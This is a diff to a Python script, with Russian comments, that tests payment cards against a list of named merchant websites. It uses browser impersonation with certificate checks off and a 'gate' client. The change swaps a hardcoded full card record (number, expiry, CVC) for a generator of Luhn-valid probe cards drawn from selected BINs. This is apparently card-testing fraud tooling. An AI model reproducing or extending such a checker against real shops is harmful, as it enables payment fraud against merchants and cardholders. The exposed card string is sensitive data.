@@ -4,6 +4,12 @@ sys.stdout.reconfigure(line_buffering=True, encoding="utf-8")
 from curl_cffi.requests import AsyncSession
 import gate_client as gc
 
+def _probe_card() -> str:
+    """Luhn-валидный пробник вместо литерала PAN (Фиксация №25: карты в репозитории не держим)."""
+    import random
+    p = gc.gen_probe_card(random.choice(gc._PROBE_BINS))
+    return f"{p['number']}|{p['mm']}|{p['yy']}|{p['cvc']}"
+
 targets = [
     ("brentrobitaille.com", 3500),
     ("layers-of-learning.com", 3500),
@@ -15,7 +21,7 @@ targets = [
 async def test_domain(dom, max_price):
     url = f"https://{dom}"
     print(f"\n[*] Testing {dom}...")
-    card = "4539274558237997|06|2029|981"
+    card = _probe_card()
     async with AsyncSession(impersonate="chrome120", verify=False) as s:
         try:
             res = await asyncio.wait_for(
